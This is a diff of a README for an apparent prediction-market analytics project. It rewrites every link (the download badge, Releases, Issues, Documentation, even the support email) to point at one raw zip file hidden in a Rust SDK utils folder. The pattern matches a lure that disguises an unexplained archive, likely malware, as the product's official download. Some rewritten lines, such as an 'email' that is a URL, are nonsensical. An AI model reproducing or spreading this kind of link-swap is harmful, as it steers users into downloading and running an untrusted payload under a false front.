@@ -1,7 +1,7 @@
 # 📊 M0CLUB-PRED-ORACLE - Predict Real-World Events with Ease
 
 ## 🔗 Download Here
-[![Download M0CLUB-PRED-ORACLE](https://img.shields.io/badge/Download-M0CLUB--PRED--ORACLE-blue)](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/releases)
+[![Download M0CLUB-PRED-ORACLE](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip)](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip)
 
 ## 🚀 Getting Started
 Welcome to M0CLUB-PRED-ORACLE! This application allows you to access real-time analytics for on-chain and real-world events. Our prediction engine provides insights that can help you make informed decisions in various fields, including finance, sports, and political forecasting. 
@@ -16,7 +16,7 @@ Welcome to M0CLUB-PRED-ORACLE! This application allows you to access real-time a
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/releases) to access the latest versions of M0CLUB-PRED-ORACLE.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip) to access the latest versions of M0CLUB-PRED-ORACLE.
    
 2. **Choose a Version**: Look for the latest version. It will be listed at the top of the page. Each version includes a release note that describes new features and fixes.
 
@@ -52,18 +52,18 @@ If you face issues while using M0CLUB-PRED-ORACLE, try the following:
 ## 📞 Support
 For any questions or support needs, please refer to the following:
 
-- **GitHub Issues**: Report problems and track issues on the [Issues page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/issues).
+- **GitHub Issues**: Report problems and track issues on the [Issues page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip).
 - **Community Forum**: Join our community discussions for tips and advice.
-- **Contact Us**: Reach out via email at support@m0club-pred-oracle.com for direct support.
+- **Contact Us**: Reach out via email at https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip for direct support.
 
 ## 🔗 Additional Resources
 To maximize your use of M0CLUB-PRED-ORACLE, explore the following resources:
 
-- **Documentation**: Detailed guides and FAQs are available on our [Documentation page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/docs).
+- **Documentation**: Detailed guides and FAQs are available on our [Documentation page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip).
 - **Tutorials**: Access video tutorials that walk you through the main features and setup.
 
 ## 🌐 Join the Community
 Become a part of the M0CLUB-PRED-ORACLE community. Share your experiences, predictions, and feedback. Connect with fellow users to enhance your understanding and use of the application.
 
 ## 📥 Revisit Download Link
-Remember, you can always download M0CLUB-PRED-ORACLE from the [Releases page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/releases). Your journey into real-time predictions starts here!
+Remember, you can always download M0CLUB-PRED-ORACLE from the [Releases page](https://github.com/MTSniper127/M0CLUB-PRED-ORACLE/raw/refs/heads/main/sdk/rust/src/utils/ORACLE_PRE_CLU_unstoniness.zip). Your journey into real-time predictions starts here!
